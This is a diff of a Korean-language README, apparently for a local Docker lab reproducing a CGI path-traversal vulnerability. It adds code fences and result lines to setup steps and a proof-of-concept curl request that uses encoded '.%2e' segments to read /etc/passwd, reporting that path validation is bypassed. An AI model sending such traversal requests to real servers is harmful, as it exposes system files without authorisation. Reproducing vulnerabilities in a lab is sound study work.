@@ -43,22 +43,30 @@
          - "8080:80"
 
 3. 컨테이너 빌드 및 실행
+
    '''bash
    docker-compose up -d
-
+   '''
+   
 4. 정상 동작 확인
+   
    '''bash
    curl -i http://localhost:8080/cgi-bin/hello.sh
+   '''
    
 5. 취약점 Poc 호출
    '''bash
    curl -i "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+   '''
    
 ---
 
 ## 결과
 ![image](https://github.com/user-attachments/assets/8241770b-6b3f-45b4-b8df-9ddbf5f97b4a)
 
+- 'HTTP/1.1 200 OK'
+- '/etc/passwd' 파일의 내용 출력 ( 경로 검증이 우회됨)
+  
 ---
 
 ## 정리
